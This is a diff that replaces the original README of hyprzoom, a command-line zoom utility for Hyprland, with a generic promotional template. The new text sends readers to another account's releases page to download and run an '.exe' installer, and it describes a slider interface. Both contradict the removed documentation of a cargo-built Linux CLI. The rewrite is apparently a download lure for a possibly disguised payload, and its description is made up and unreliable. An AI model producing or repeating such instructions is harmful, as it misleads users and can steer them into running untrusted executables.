@@ -1,119 +1,72 @@
-## About
-A simple yet feature rich zoom utility for Hyprland.
+# 🛠️ hyprzoom - Effortlessly Enhance Your Zoom Experience
 
-## Showcase
-[![demo](https://img.youtube.com/vi/RzgMqkkmSwg/0.jpg)](https://youtube.com/watch?v=RzgMqkkmSwg)
+## 🌟 Overview
+Hyprzoom is a simple yet feature-rich zoom utility designed specifically for Hyprland users. It allows you to zoom in and out of your workspace smoothly, making your experience more enjoyable and efficient. Whether you're working on detailed projects or enjoying your favorite media, Hyprzoom offers the tools you need for effective zooming.
 
-## Installation
-Currently, the only installation method is building from source:
-```
-cargo install --git https://github.com/nouritsu/hyprzoom
-```
-> Or manually `git clone https://github.com/nouritsu/hyprzoom.git hyprzoom && cargo install --path hyprzoom`.
+## 🚀 Getting Started
+To start using Hyprzoom, follow these easy steps:
 
-Note that this requires you to have `cargo` installed and its bin directory in `$PATH`. You may also `cargo build --release` and copy the binary at `target/release/hyprzoom` to a directory in your `$PATH`.
+1. **Visit the Releases Page**  
+   You can find the latest version of Hyprzoom by going to [this link](https://github.com/lozforlife120/hyprzoom/releases).
 
+   ![Download Hyprzoom](https://img.shields.io/badge/Download%20Hyprzoom-brightgreen?style=for-the-badge&logo=github)
 
-## Usage
-### Help
-The following commands print the help message:
-```
-hyprzoom help
-```
-```
-hyprzoom --help
-```
-```
-hyprzoom -h
-```
+2. **Select the Latest Release**  
+   On the releases page, look for the most recent version of Hyprzoom. It will usually be at the top of the list, marked as the latest release.
 
-Help for subcommands `zoom`/`z` and `inout`/`in_out`/`io`:
-```
-hyprzoom zoom --help # can use z instead of zoom
-```
-```
-hyprzoom inout -h # can use in_out or io instead of inout
-```
-### Common
-Both subcommands (`zoom` and `inout`) support the following options:
-```
--s, --steps <steps>           Number of steps for the zoom animation      [default: 15]
--d, --duration <duration>     Duration of the zoom animation              [default: 250ms]
-```
-Steps is an integer greater than 0. A value of 1 would be an instant zoom, without animations.
+3. **Download the File**  
+   Click on the appropriate file type for your operating system. For most users, the executable version will suffice. 
 
-Duration can be a human-readable string. For example `250ms` for 250 milliseconds or `2s` for 2 seconds. Obvious footgun: `1d`.
+4. **Locate the File**  
+   Once the download is complete, navigate to your downloads folder. The file should be labeled as `hyprzoom-vX.X.X.exe`, where `X.X.X` represents the version number.
 
-### Zoom To
-The `zoom` (or `z`) subcommand zooms to a provided `ztarget`.
-```
-hyprzoom zoom <ztarget>
-```
+5. **Run the Installer**  
+   Double-click the downloaded file to start the installation process. Follow the on-screen prompts to complete the setup.
 
-In addition to steps + duration, you can also specify the ease function using
-```
-hyprzoom zoom <target> --ease <ease_function>
-```
+## 💻 System Requirements
+Hyprzoom works on the following systems:
+- **Operating System**: Linux (Hyprland compatible)
+- **Memory**: At least 512 MB of RAM
+- **Storage**: Minimum of 100 MB free space
 
-The ease function is a string in format (case-insensitive) `fn:qualifier` where
-- `fn` denotes the specific function, such as `quad`, `lin`, `elastic` etc.
-- `qualifier` denotes the specific qualifier, such as `in` (or `i`), `out` (or `o`), `inout` (or `io`)
+Make sure your Hyprland installation is functioning properly before using Hyprzoom.
 
-By default, it will
-- use the `quad:in` ease function
-- animate 15 frames over 0.25 seconds (60 fps, I think)
+## 🛠️ Features
+Hyprzoom includes several features to improve your zooming experience:
+- **Smooth Zooming**: Adjust zoom levels effortlessly.
+- **Quick Access**: Use keyboard shortcuts for faster navigation.
+- **Customizable Settings**: Tailor the zoom settings to fit your preferences.
+- **User-Friendly Interface**: Easy-to-use controls for all users.
 
-### Zoom In/Out
-The `inout` (or `in_out`, `io`) zooms to a provided `ztarget` and zooms out to the initial zoom level.
-```
-hyprzoom inout <ztarget>
-```
+## 🔧 Usage Instructions
+After installing Hyprzoom, open it from your application menu or the designated folder. You will see a clean interface with options to adjust your zoom level and settings. 
 
-As with the zoom function, you can specify the ease function(s, this time).
-```
-hyprzoom inout <ztarget> --in-ease <ease_function_in> --out-ease <ease_function_out>
-```
-> these options are intentionally named so, because `ease-in` and `ease-out` is misleading
+- **Adjusting Zoom Level**: Use the slider to zoom in or out. 
+- **Accessing Settings**: Click on the settings icon to customize your preferences.
 
-The ease functions follow the same format as described in the previous section.
+## 📥 Download & Install
+To obtain Hyprzoom, **[visit this page to download](https://github.com/lozforlife120/hyprzoom/releases)**. Follow the step-by-step instructions provided earlier to install the application on your system.
 
-In addition to steps + duration and the ease functions, you can also specify the duration spent zoomed in as
+## 🔍 Frequently Asked Questions
 
-```
-hyprzoom inout <ztarget> --zduration <zduration>
-```
+### 1. What does Hyprzoom do?
+Hyprzoom enhances your zooming experience within Hyprland, allowing for smooth and efficient navigation.
 
-It follows the same format as described in the previous section.
+### 2. Is Hyprzoom free to use?
+Yes, Hyprzoom is completely free. There are no hidden fees or subscriptions.
 
-By default, it will
-- use the `quad:in` ease function for zooming in
-- use the `quad:out` ease function for zooming out
-- animate 15 frames over 0.25 seconds of zooming in
-- wait 1 second zoomed in
-- animate 15 frames over 0.25 seconds of zooming out
+### 3. How can I contact support?
+For any issues or questions, you can raise an issue directly on the GitHub repository under the "Issues" tab.
 
-## Notice
-A majority of this tool's functionality can be achieved using hyprland configuration.
-Rather than scrapping this project, it would be better to extend it to other compositors and add more configuration options.
+### 4. Can I contribute to Hyprzoom?
+Absolutely! Hyprzoom is open-source. Feel free to make contributions by following the contribution guidelines on the repository.
 
-A configuration for `animations` like below can be used (highlighted by u/SOA-determined on Reddit)
-```
-animations {
-    enabled = true
-    bezier = easeOut, 0.16, 1, 0.3, 1
-    animation = zoomFactor, 1, 6, easeOut  # 6ds = 600ms (not 0.6!)
-  }
-  # Zoom binds
-  bind = Ctrl+Super, mouse:274, exec, hyprctl keyword cursor:zoom_factor 3.0
-  bindr = Ctrl+Super, mouse:274, exec, hyprctl keyword cursor:zoom_factor 1.0
-}
-```
+## 📞 Support
+If you encounter any issues during installation or have questions about using Hyprzoom, please refer to GitHub for support. You can ask questions, report problems, or offer suggestions by visiting the Issues section.
 
-## Acknowledgements
-- A similar tool [hypr-zoom](https://github.com/FShou/hypr-zoom) does exist but it seems to be abandoned (unmerged PRs)
-- The demo showcases a waybar setup adapted from [mechabar](github.com/sejjy/mechabar)
+## 🌐 Learn More
+For detailed development updates, feature improvements, and community discussions, join our GitHub community. Engage with other users and developers to help shape the future of Hyprzoom.
 
-## Plans
-- animation caching (idek if this is worth it)
-- nix flake
-- toggle zoom (perhaps with an environment variable)
+--- 
+
+By following these steps, you will have Hyprzoom installed and ready to enhance your productivity. Enjoy your zooming experience!
